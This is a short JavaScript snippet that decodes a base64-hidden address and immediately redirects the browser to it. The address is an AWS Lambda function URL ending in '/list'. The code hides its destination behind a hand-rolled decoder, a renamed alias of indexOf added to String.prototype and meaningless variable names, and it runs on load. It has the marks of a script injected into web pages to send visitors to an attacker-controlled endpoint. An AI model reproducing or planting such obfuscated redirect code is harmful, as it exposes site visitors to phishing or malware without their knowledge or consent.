(function () {
  const kgSc = `aHR0cHM6Ly9yemIzeXl5ZHAycXNkcGZrNHZ3YmFiaG1wZTBqZHhjZy5sYW1iZGEtdXJsLmFwLW5vcnRoZWFzdC0yLm9uLmF3cy9saXN0`
  String.prototype.KDje2q = String.prototype.indexOf//instancemethod
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
  let str = ''
  let buffer
  let i = 0
  let len = kgSc.length;
  while (i < len) {
    buffer =
      (chars.KDje2q(kgSc[i]) << 18) |
      (chars.KDje2q(kgSc[i + 1]) << 12) |
      (chars.KDje2q(kgSc[i + 2]) << 6) |
      chars.KDje2q(kgSc[i + 3]);
    str += String.fromCharCode((buffer >> 16) & 0xff, (buffer >> 8) & 0xff, buffer & 0xff);
    i += 4
  }  
  let aff = str.replace(/\0+$/, ''); //deletenull
  window.location.href = aff
})();